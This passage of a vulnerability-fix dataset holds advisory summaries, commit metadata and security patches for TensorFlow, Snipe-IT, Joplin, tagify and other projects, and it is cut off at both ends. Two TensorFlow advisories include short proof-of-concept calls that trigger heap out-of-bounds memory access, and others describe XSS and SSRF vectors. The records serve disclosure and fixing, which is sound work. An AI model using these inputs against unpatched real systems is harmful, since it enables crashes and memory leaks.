'09\/05\/2018, 19:49:45', 'body': '@SegfaultMasters would you be able to submit a vuln repot on the HackerOne platform with the details?'}}","stats":"{'additions': 47, 'deletions': 0, 'total': 47}","files":"{'SECURITY.md': {'additions': 47, 'deletions': 0, 'changes': 47, 'status': 'added', 'raw_url': 'https:\/\/github.com\/unshiftio\/url-parse\/raw\/d7b582ec1243e8024e60ac0b62d2569c939ef5de\/SECURITY.md', 'patch': \"@@ -0,0 +1,47 @@\\n+# Security Guidelines\\n+\\n+Please contact us directly at **security@3rd-Eden.com** for any bug that might\\n+impact the security of this project. Please prefix the subject of your email\\n+with `[security]` in lowercase and square brackets. Our email filters will\\n+automatically prevent these messages from being moved to our spam box. All\\n+emails that do not include security vulnerabilities will be removed and blocked\\n+instantly.\\n+\\n+In addition to a dedicated email address to receive security related reports,\\n+we also have a [Hacker1 account][hacker1] that can be used be used for\\n+communicating security related issues.\\n+\\n+You will receive an acknowledgement of your report within **24 hours** of\\n+notification.\\n+\\n+## Exceptions\\n+\\n+If you do not receive an acknowledgement within the said time frame please give\\n+us the benefit of the doubt as it's possible that we haven't seen it yet. In\\n+this case please send us a message **without details** using one of the\\n+following methods:\\n+\\n+- Give a poke on Twitter [@3rdEden](https:\/\/twitter.com\/3rdEden)\\n+- Contact the lead developers of this project on their personal e-mails. You\\n+  can find the e-mails in the git logs, for example using the following command:\\n+  `git --no-pager show -s --format='%an <%ae>' <gitsha>` where `<gitsha>` is the\\n+  SHA1 of their latest commit in the project.\\n+\\n+Once we have acknowledged receipt of your report and confirmed the bug\\n+ourselves we will work with you to fix the vulnerability and publicly\\n+acknowledge your responsible disclosure, if you wish.\\n+\\n+## History\\n+\\n+> url-parse returns wrong hostname which leads to multiple vulnerabilities such\\n+> as SSRF, Open Redirect, Bypass Authentication Protocol.\\n+\\n+- Hacker1 report: https:\/\/hackerone.com\/reports\/384029\\n+- Reported by [lolwaleet](https:\/\/hackerone.com\/lolwalee)\\n+- Triaged by [Liran Tal](https:\/\/hackerone.com\/lirantal)\\n+- Fixed in: 1.4.3\\n+\\n+---\\n+\\n+[twitter]: https:\/\/twitter.com\/3rdEden\\n+[hacker1]: https:\/\/hackerone.com\/3rdeden\"}}","message_norm":"[security] added missing security.md","language":"en","entities":"[('security', 'SECWORD', ''), ('added', 'ACTION', ''), ('security.md', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['SECURITY.md'])","num_files":1.0},{"index":2648,"vuln_id":"GHSA-pvrc-hg3f-58r6","cwe_id":"{'CWE-787'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3f6fe4dfef6f57e768260b48166c27d148f3015f'}","dataset":"osv","summary":"Heap OOB access in `Dilation2DBackpropInput` ### Impact\nAn attacker can write outside the bounds of heap allocated arrays by passing invalid arguments to `tf.raw_ops.Dilation2DBackpropInput`:\n\n```python\nimport tensorflow as tf\n    \ninput_tensor = tf.constant([1.1] * 81, shape=[3, 3, 3, 3], dtype=tf.float32)\nfilter = tf.constant([], shape=[0, 0, 3], dtype=tf.float32)\nout_backprop = tf.constant([1.1] * 1062, shape=[3, 2, 59, 3], dtype=tf.float32)\n\ntf.raw_ops.Dilation2DBackpropInput(\n  input=input_tensor, filter=filter, out_backprop=out_backprop, \n  strides=[1, 40, 1, 1], rates=[1, 56, 56, 1], padding='VALID')\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/afd954e65f15aea4d438d0a219136fc4a63a573d\/tensorflow\/core\/kernels\/dilation_ops.cc#L321-L322) does not validate before writing to the output array.\n  \n```cc               \nin_backprop(b, h_in_max, w_in_max, d) += out_backprop(b, h_out, w_out, d);\n```                 \n    \nThe values for `h_out` and `w_out` are guaranteed to be in range for `out_backprop` (as they are loop indices bounded by the size of the array). However, there are no similar guarantees relating `h_in_max`\/`w_in_max` and `in_backprop`.\n\n### Patches\nWe have patched the issue in GitHub commit [3f6fe4dfef6f57e768260b48166c27d148f3015f](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3f6fe4dfef6f57e768260b48166c27d148f3015f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/3f6fe4dfef6f57e768260b48166c27d148f3015f","commit_sha":"3f6fe4dfef6f57e768260b48166c27d148f3015f","patch":"SINGLE","chain_ord":"['3f6fe4dfef6f57e768260b48166c27d148f3015f']","before_first_fix_commit":"{'afd954e65f15aea4d438d0a219136fc4a63a573d'}","last_fix_commit":"3f6fe4dfef6f57e768260b48166c27d148f3015f","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 01:33:28","message":"Add missing validations in dillation ops.\n\nPiperOrigin-RevId: 372037158\nChange-Id: I4ee304c84a02550c030288a6534000b934fc1599","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 11, 'deletions': 4, 'total': 15}","files":"{'tensorflow\/core\/kernels\/dilation_ops.cc': {'additions': 11, 'deletions': 4, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/3f6fe4dfef6f57e768260b48166c27d148f3015f\/tensorflow%2Fcore%2Fkernels%2Fdilation_ops.cc', 'patch': '@@ -130,6 +130,7 @@ class DilationOp : public OpKernel {\\n     ParseSizes(context, strides_, rates_, padding_, &stride_rows, &stride_cols,\\n                &rate_rows, &rate_cols, &pad_top, &pad_left, &out_rows,\\n                &out_cols);\\n+    if (!context->status().ok()) return;\\n \\n     \/\/ Output tensor is of the following dimensions:\\n     \/\/ [ batch, out_rows, out_cols, depth ]\\n@@ -229,6 +230,7 @@ class DilationBackpropInputOp : public OpKernel {\\n     ParseSizes(context, strides_, rates_, padding_, &stride_rows, &stride_cols,\\n                &rate_rows, &rate_cols, &pad_top, &pad_left, &out_rows,\\n                &out_cols);\\n+    if (!context->status().ok()) return;\\n \\n     \/\/ Verify that the incoming gradient tensor has the expected size\\n     \/\/ [ batch, out_rows, out_cols, depth ]\\n@@ -318,8 +320,10 @@ struct DilationBackpropInput<CPUDevice, T> {\\n                 }\\n               }\\n             }\\n-            in_backprop(b, h_in_max, w_in_max, d) +=\\n-                out_backprop(b, h_out, w_out, d);\\n+            if (h_in_max < input_rows && w_in_max < input_cols) {\\n+              in_backprop(b, h_in_max, w_in_max, d) +=\\n+                  out_backprop(b, h_out, w_out, d);\\n+            }\\n           }\\n         }\\n       }\\n@@ -349,6 +353,7 @@ class DilationBackpropFilterOp : public OpKernel {\\n     ParseSizes(context, strides_, rates_, padding_, &stride_rows, &stride_cols,\\n                &rate_rows, &rate_cols, &pad_top, &pad_left, &out_rows,\\n                &out_cols);\\n+    if (!context->status().ok()) return;\\n \\n     \/\/ Verify that the incoming gradient tensor has the expected size\\n     \/\/ [ batch, out_rows, out_cols, depth ]\\n@@ -438,8 +443,10 @@ struct DilationBackpropFilter<CPUDevice, T> {\\n                 }\\n               }\\n             }\\n-            filter_backprop(h_max, w_max, d) +=\\n-                out_backprop(b, h_out, w_out, d);\\n+            if (h_max < filter_rows && w_max < filter_cols) {\\n+              filter_backprop(h_max, w_max, d) +=\\n+                  out_backprop(b, h_out, w_out, d);\\n+            }\\n           }\\n         }\\n       }'}}","message_norm":"add missing validations in dillation ops.\n\npiperorigin-revid: 372037158\nchange-id: i4ee304c84a02550c030288a6534000b934fc1599","language":"en","entities":"[('add', 'ACTION', ''), ('missing validations', 'SECWORD', ''), ('372037158', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/dilation_ops.cc'])","num_files":1.0},{"index":2659,"vuln_id":"GHSA-pwwm-pwx2-2hw7","cwe_id":"{'CWE-209'}","score":5.3,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/178e44095141ab805c282f563fb088df1a10b2e2'}","dataset":"osv","summary":"Generation of Error Message Containing Sensitive Information in Snipe-IT Snipe-IT prior to version 5.3.11 is vulnerable to Generation of Error Message Containing Sensitive Information.","published_date":"2022-02-18","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/178e44095141ab805c282f563fb088df1a10b2e2","commit_sha":"178e44095141ab805c282f563fb088df1a10b2e2","patch":"SINGLE","chain_ord":"['178e44095141ab805c282f563fb088df1a10b2e2']","before_first_fix_commit":"{'321be4733d3997fc738f0118e1b9af5905f95439'}","last_fix_commit":"178e44095141ab805c282f563fb088df1a10b2e2","chain_ord_pos":1.0,"commit_datetime":"02\/16\/2022, 02:09:58","message":"Added usleep :(\n\nSigned-off-by: snipe <snipe@snipe.net>","author":"snipe","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'app\/Http\/Controllers\/Auth\/ForgotPasswordController.php': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/178e44095141ab805c282f563fb088df1a10b2e2\/app%2FHttp%2FControllers%2FAuth%2FForgotPasswordController.php', 'patch': \"@@ -87,6 +87,8 @@ public function sendResetLinkEmail(Request $request)\\n             \\\\Log::info('Password reset attempt: User '.$request->input('username').'failed with exception: '.$e );\\n         }\\n \\n+        \/\/ Prevent timing attack to enumerate users.\\n+        usleep(500000 + random_int(0, 1500000));\\n \\n         if ($response === \\\\Password::RESET_LINK_SENT) {\\n             \\\\Log::info('Password reset attempt: User '.$request->input('username').' WAS found, password reset sent');\"}}","message_norm":"added usleep :(\n\nsigned-off-by: snipe <snipe@snipe.net>","language":"en","entities":"[('added', 'ACTION', ''), ('snipe@snipe.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Auth\/ForgotPasswordController.php'])","num_files":1.0},{"index":2669,"vuln_id":"GHSA-pxcf-v868-m492","cwe_id":"{'CWE-74', 'CWE-79'}","score":7.6,"chain":"{'https:\/\/github.com\/jperelli\/osm-static-maps\/commit\/97355d29e08753d1cfe99b1281dbaa06f4e651b0'}","dataset":"osv","summary":"Injection and Cross-site Scripting in osm-static-maps This affects all versions of package osm-static-maps under 3.9.0. User input given to the package is passed directly to a template without escaping ({{{ ... }}}). As such, it is possible for an attacker to inject arbitrary HTML\/JS code and depending on the context. It will be outputted as an HTML on the page which gives opportunity for XSS or rendered on the server (puppeteer) which also gives opportunity for SSRF and Local File Read.","published_date":"2021-05-10","chain_len":1,"project":"https:\/\/github.com\/jperelli\/osm-static-maps","commit_href":"https:\/\/github.com\/jperelli\/osm-static-maps\/commit\/97355d29e08753d1cfe99b1281dbaa06f4e651b0","commit_sha":"97355d29e08753d1cfe99b1281dbaa06f4e651b0","patch":"SINGLE","chain_ord":"['97355d29e08753d1cfe99b1281dbaa06f4e651b0']","before_first_fix_commit":"{'6bce2e2a8dd4cbbbbe083820e494ba858be74b16'}","last_fix_commit":"97355d29e08753d1cfe99b1281dbaa06f4e651b0","chain_ord_pos":1.0,"commit_datetime":"10\/11\/2020, 23:25:42","message":"fix: escape special characters before insertion to template","author":"snoopysecurity","comments":null,"stats":"{'additions': 25, 'deletions': 6, 'total': 31}","files":"{'src\/server.js': {'additions': 25, 'deletions': 6, 'changes': 31, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jperelli\/osm-static-maps\/raw\/97355d29e08753d1cfe99b1281dbaa06f4e651b0\/src%2Fserver.js', 'patch': '@@ -19,6 +19,23 @@ app.use((req, res, next) => {\\n   next();\\n });\\n \\n+\\n+function htmlEscape(text) {\\n+  return text.replace(\/&\/g, \\'&amp;\\').\\n+  replace(\/<\/g, \\'&lt;\\').\\n+  replace(\/\"\/g, \\'&quot;\\').\\n+  replace(\/\\'\/g, \\'&#039;\\');\\n+}\\n+\\n+\\n+function sanitize(params) {\\n+  result = {}\\n+  for (let [key, value] of Object.entries(params)) {\\n+      result[key] = htmlEscape(value)\\n+  }\\n+  return result;\\n+}\\n+\\n app.get(\"\/health\", (req, res) => res.sendStatus(200));\\n \\n const handler = (res, params) => {\\n@@ -40,12 +57,14 @@ const handler = (res, params) => {\\n app.get(\"\/\", (req, res) => handler(res, req.query));\\n app.post(\"\/\", (req, res) => handler(res, req.body));\\n \\n-app.get(\"\/dynamic\", (req, res) =>\\n-  handler(res, { ...req.query, renderToHtml: true })\\n-);\\n+app.get(\"\/dynamic\", (req, res) => {\\n+  var sanitized = sanitize(req.query)\\n+  handler(res, { ...sanitized, renderToHtml: true })\\n+})\\n \\n-app.post(\"\/dynamic\", (req, res) =>\\n-  handler(res, { ...req.body, renderToHtml: true })\\n-);\\n+app.post(\"\/dynamic\", (req, res) => {\\n+  var sanitized = sanitize(req.body)\\n+  handler(res, { ...sanitized, renderToHtml: true })\\n+})\\n \\n module.exports = http.createServer(app);'}}","message_norm":"fix: escape special characters before insertion to template","language":"en","entities":"[('fix', 'ACTION', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/server.js'])","num_files":1.0},{"index":2670,"vuln_id":"GHSA-pxpf-v376-7xx5","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/yairEO\/tagify\/commit\/198c0451fad188390390395ccfc84ab371def4c7'}","dataset":"osv","summary":"tagify can pass a malicious placeholder to initiate the cross-site scripting (XSS) payload This affects the package @yaireo\/tagify before 4.9.8. The package is used for rendering UI components inside the input or text fields, and an attacker can pass a malicious placeholder value to it to fire the cross-site scripting (XSS) payload.","published_date":"2022-04-30","chain_len":1,"project":"https:\/\/github.com\/yairEO\/tagify","commit_href":"https:\/\/github.com\/yairEO\/tagify\/commit\/198c0451fad188390390395ccfc84ab371def4c7","commit_sha":"198c0451fad188390390395ccfc84ab371def4c7","patch":"SINGLE","chain_ord":"['198c0451fad188390390395ccfc84ab371def4c7']","before_first_fix_commit":"{'93f729c6d1bf45666a1dc21d5cae3aefe1b18043'}","last_fix_commit":"198c0451fad188390390395ccfc84ab371def4c7","chain_ord_pos":1.0,"commit_datetime":"02\/17\/2022, 08:16:09","message":"fixes #989 - fix XSS","author":"Yair Even Or","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'src\/tagify.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/yairEO\/tagify\/raw\/198c0451fad188390390395ccfc84ab371def4c7\/src%2Ftagify.js', 'patch': '@@ -101,7 +101,7 @@ Tagify.prototype = {\\n \\n         _s.disabled = input.hasAttribute(\\'disabled\\')\\n         _s.readonly = _s.readonly || input.hasAttribute(\\'readonly\\')\\n-        _s.placeholder = input.getAttribute(\\'placeholder\\') || _s.placeholder || \"\"\\n+        _s.placeholder = escapeHTML(input.getAttribute(\\'placeholder\\') || _s.placeholder || \"\")\\n         _s.required = input.hasAttribute(\\'required\\')\\n \\n         for( let name in _s.classNames )'}}","message_norm":"fixes #989 - fix xss","language":"ca","entities":"[('fixes', 'ACTION', ''), ('#989', 'ISSUE', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/tagify.js'])","num_files":1.0},{"index":2673,"vuln_id":"GHSA-q263-fvxm-m5mw","cwe_id":"{'CWE-908', 'CWE-125'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0cc38aaa4064fd9e79101994ce9872c6d91f816b'}","dataset":"osv","summary":"Heap out of bounds access in MakeEdge in TensorFlow ### Impact\nUnder certain cases, loading a saved model can result in accessing uninitialized memory while building the computation graph. The [`MakeEdge` function](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/3616708cb866365301d8e67b43b32b46d94b08a0\/tensorflow\/core\/common_runtime\/graph_constructor.cc#L1426-L1438) creates an edge between one output tensor of the `src` node (given by `output_index`) and the input slot of the `dst` node (given by `input_index`). This is only possible if the types of the tensors on both sides coincide, so the function begins by obtaining the corresponding `DataType` values and comparing these for equality:\n\n```cc\n  DataType src_out = src->output_type(output_index);\n  DataType dst_in = dst->input_type(input_index);\n  \/\/...\n```\n\nHowever, there is no check that the indices point to inside of the arrays they index into. Thus, this can result in accessing data out of bounds of the corresponding heap allocated arrays.\n\nIn most scenarios, this can manifest as unitialized data access, but if the index points far away from the boundaries of the arrays this can be used to leak addresses from the library.\n\n### Patches\nWe have patched the issue in GitHub commit [0cc38aaa4064fd9e79101994ce9872c6d91f816b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0cc38aaa4064fd9e79101994ce9872c6d91f816b) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2020-12-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0cc38aaa4064fd9e79101994ce9872c6d91f816b","commit_sha":"0cc38aaa4064fd9e79101994ce9872c6d91f816b","patch":"SINGLE","chain_ord":"['0cc38aaa4064fd9e79101994ce9872c6d91f816b']","before_first_fix_commit":"{'3616708cb866365301d8e67b43b32b46d94b08a0'}","last_fix_commit":"0cc38aaa4064fd9e79101994ce9872c6d91f816b","chain_ord_pos":1.0,"commit_datetime":"12\/08\/2020, 17:31:57","message":"Prevent unitialized memory access in `GraphConstructor::MakeEdge`\n\nThe `MakeEdge` implementation assumes that there exists an output at `output_index` of `src` node and an input at `input_index` of `dst` node. However, if this is not the case this results in accessing data out of bounds. Because we are accessing an array that is a private member of a class and only in read only mode, this usually results only in unitialized memory access. However, it is reasonable to think that malicious users could manipulate these indexes to actually read data outside the class, thus resulting in information leakage and further exploits.\n\nPiperOrigin-RevId: 346343288\nChange-Id: I2127da27c2023d27f26efd39afa6c853385cab6f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/common_runtime\/graph_constructor.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0cc38aaa4064fd9e79101994ce9872c6d91f816b\/tensorflow%2Fcore%2Fcommon_runtime%2Fgraph_constructor.cc', 'patch': '@@ -44,6 +44,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/lib\/gtl\/inlined_vector.h\"\\n #include \"tensorflow\/core\/lib\/strings\/scanner.h\"\\n #include \"tensorflow\/core\/lib\/strings\/str_util.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/platform\/logging.h\"\\n #include \"tensorflow\/core\/platform\/macros.h\"\\n #include \"tensorflow\/core\/public\/version.h\"\\n@@ -1425,6 +1426,17 @@ void GraphConstructor::Undo() {\\n \\n Status GraphConstructor::MakeEdge(Node* src, int output_index, Node* dst,\\n                                   int input_index) {\\n+  if (output_index >= src->num_outputs()) {\\n+    return errors::InvalidArgument(\\n+        \"Output \", output_index, \" of node \", src->name(),\\n+        \" does not exist. Node only has \", src->num_outputs(), \" outputs.\");\\n+  }\\n+  if (input_index >= dst->num_inputs()) {\\n+    return errors::InvalidArgument(\\n+        \"Input \", input_index, \" of node \", dst->name(),\\n+        \" does not exist. Node only has \", dst->num_inputs(), \" inputs.\");\\n+  }\\n+\\n   DataType src_out = src->output_type(output_index);\\n   DataType dst_in = dst->input_type(input_index);\\n   if (!TypesCompatible(dst_in, src_out)) {'}}","message_norm":"prevent unitialized memory access in `graphconstructor::makeedge`\n\nthe `makeedge` implementation assumes that there exists an output at `output_index` of `src` node and an input at `input_index` of `dst` node. however, if this is not the case this results in accessing data out of bounds. because we are accessing an array that is a private member of a class and only in read only mode, this usually results only in unitialized memory access. however, it is reasonable to think that malicious users could manipulate these indexes to actually read data outside the class, thus resulting in information leakage and further exploits.\n\npiperorigin-revid: 346343288\nchange-id: i2127da27c2023d27f26efd39afa6c853385cab6f","language":"en","entities":"[('prevent', 'ACTION', ''), ('out of bounds', 'SECWORD', ''), ('malicious', 'SECWORD', ''), ('manipulate', 'ACTION', ''), ('information leakage', 'SECWORD', ''), ('exploits', 'SECWORD', ''), ('346343288', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/common_runtime\/graph_constructor.cc'])","num_files":1.0},{"index":2674,"vuln_id":"GHSA-q26w-wjj2-22vv","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/laurent22\/joplin\/commit\/fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13'}","dataset":"osv","summary":"Cross-site scripting in Joplin Joplin allows XSS via a LINK element in a note.","published_date":"2021-05-10","chain_len":1,"project":"https:\/\/github.com\/laurent22\/joplin","commit_href":"https:\/\/github.com\/laurent22\/joplin\/commit\/fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13","commit_sha":"fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13","patch":"SINGLE","chain_ord":"['fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13']","before_first_fix_commit":"{'4a184721e4e4aa00a39d508cdc1a3ae660d3610e'}","last_fix_commit":"fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13","chain_ord_pos":1.0,"commit_datetime":"10\/29\/2020, 16:19:56","message":"All: Security: Remove \"link\" and \"meta\" tags from notes to prevent XSS","author":"Laurent Cozic","comments":null,"stats":"{'additions': 10, 'deletions': 5, 'total': 15}","files":"{'ReactNativeClient\/lib\/joplin-renderer\/htmlUtils.js': {'additions': 10, 'deletions': 5, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/laurent22\/joplin\/raw\/fd90a490c0e5cacd17bfe0ffc422be1d2a9b1c13\/ReactNativeClient%2Flib%2Fjoplin-renderer%2FhtmlUtils.js', 'patch': '@@ -87,11 +87,16 @@ class HtmlUtils {\\n \\t\\t\\treturn tagStack[tagStack.length - 1];\\n \\t\\t};\\n \\n-\\t\\t\/\/ The BASE tag allows changing the base URL from which files are loaded, and\\n-\\t\\t\/\/ that can break several plugins, such as Katex (which needs to load CSS\\n-\\t\\t\/\/ files using a relative URL). For that reason it is disabled.\\n-\\t\\t\/\/ More info: https:\/\/github.com\/laurent22\/joplin\/issues\/3021\\n-\\t\\tconst disallowedTags = [\\'script\\', \\'iframe\\', \\'frameset\\', \\'frame\\', \\'object\\', \\'base\\', \\'embed\\'];\\n+\\t\\t\/\/ The BASE tag allows changing the base URL from which files are\\n+\\t\\t\/\/ loaded, and that can break several plugins, such as Katex (which\\n+\\t\\t\/\/ needs to load CSS files using a relative URL). For that reason\\n+\\t\\t\/\/ it is disabled. More info:\\n+\\t\\t\/\/ https:\/\/github.com\/laurent22\/joplin\/issues\/3021\\n+\\t\\t\/\/\\n+\\t\\t\/\/ \"link\" can be used to escape the parser and inject JavaScript.\\n+\\t\\t\/\/ Adding \"meta\" too for the same reason as it shouldn\\'t be used in\\n+\\t\\t\/\/ notes anyway.\\n+\\t\\tconst disallowedTags = [\\'script\\', \\'iframe\\', \\'frameset\\', \\'frame\\', \\'object\\', \\'base\\', \\'embed\\', \\'link\\', \\'meta\\'];\\n \\n \\t\\tconst parser = new htmlparser2.Parser({'}}","message_norm":"all: security: remove \"link\" and \"meta\" tags from notes to prevent xss","language":"en","entities":"[('security', 'SECWORD', ''), ('remove', 'ACTION', ''), ('prevent', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['ReactNativeClient\/lib\/joplin-renderer\/htmlUtils.js'])","num_files":1.0},{"index":2682,"vuln_id":"GHSA-q3g3-h9r4-prrc","cwe_id":"{'CWE-125'}","score":7.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/93f428fd1768df147171ed674fee1fc5ab8309ec'}","dataset":"osv","summary":"Reference binding to nullptr and heap OOB in binary cwise ops ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all binary cwise operations that don't require broadcasting (e.g., gradients of binary cwise operations):\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SqrtGrad(y=[4, 16],dy=[])\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/cwise_ops_common.h#L264) assumes that the two inputs have exactly the same number of elements but does not check that. Hence, when the eigen functor executes it triggers heap OOB reads and undefined behavior due to binding to nullptr.\n\n### Patches\nWe have patched the issue in GitHub commit [93f428fd1768df147171ed674fee1fc5ab8309ec](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/93f428fd1768df147171ed674fee1fc5ab8309ec).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo  360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/93f428fd1768df147171ed674fee1fc5ab8309ec","commit_sha":"93f428fd1768df147171ed674fee1fc5ab8309ec","patch":"SINGLE","chain_ord":"['93f428fd1768df147171ed674fee1fc5ab8309ec']","before_first_fix_commit":"{'bc9c546ce7015c57c2f15c168b3d9201de679a1d'}","last_fix_commit":"93f428fd1768df147171ed674fee1fc5ab8309ec","chain_ord_pos":1.0,"commit_datetime":"07\/31\/2021, 04:42:36","message":"Fix nullptr deref and heap OOB access in binary cwise ops.\n\nPiperOrigin-RevId: 387936777\nChange-Id: I608b8074cec36a982cca622b7144cb2c43e6e19f","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/cwise_ops_common.h': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/93f428fd1768df147171ed674fee1fc5ab8309ec\/tensorflow%2Fcore%2Fkernels%2Fcwise_ops_common.h', 'patch': '@@ -265,6 +265,11 @@ class SimpleBinaryOp : public OpKernel {\\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& in0 = ctx->input(0);\\n     const Tensor& in1 = ctx->input(1);\\n+    OP_REQUIRES(\\n+        ctx, in0.NumElements() == in1.NumElements(),\\n+        errors::InvalidArgument(\"The two arguments to a cwise op must have \"\\n+                                \"same number of elements, got \",\\n+                                in0.NumElements(), \" and \", in1.NumElements()));\\n     auto in0_flat = in0.flat<Tin>();\\n     auto in1_flat = in1.flat<Tin>();\\n     const Device& eigen_device = ctx->eigen_device<Device>();'}}","message_norm":"fix nullptr deref and heap oob access in binary cwise ops.\n\npiperorigin-revid: 387936777\nchange-id: i608b8074cec36a982cca622b7144cb2c43e6e19f","language":"en","entities":"[('fix', 'ACTION', ''), ('nullptr', 'SECWORD', ''), ('heap oob', 'SECWORD', ''), ('387936777', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/cwise_ops_common.h'])","num_files":1.0},{"index":2689,"vuln_id":"GHSA-q3x2-jvp3-wj78","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/975fc1d6d3fba598ee550849ceb81af23ce72e08'}","dataset":"osv","summary":"Unrestricted XML files leading to cross-site scripting in Microweber Microweber prior to 1.2.12 allows unrestricted upload of XML files, which malicious actors can exploit to cause a stored cross-site scripting attack.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/975fc1d6d3fba598ee550849ceb81af23ce72e08","commit_sha":"975fc1d6d3fba598ee550849ceb81af23ce72e08","patch":"SINGLE","chain_ord":"['975fc1d6d3fba598ee550849ceb81af23ce72e08']","before_first_fix_commit":"{'27622f02c39d4cce67c43e5da38a6ab504202e13'}","last_fix_commit":"975fc1d6d3fba598ee550849ceb81af23ce72e08","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2022, 15:29:28","message":"Update Files.php","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/MicroweberPackages\/Utils\/System\/Files.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/975fc1d6d3fba598ee550849ceb81af23ce72e08\/src%2FMicroweberPackages%2FUtils%2FSystem%2FFiles.php', 'patch': \"@@ -1154,11 +1154,11 @@ function get_allowed_files_extensions_for_upload($fileTypes = 'images', $returnA\\n                 break;\\n             case 'file':\\n             case 'files':\\n-                $are_allowed .= 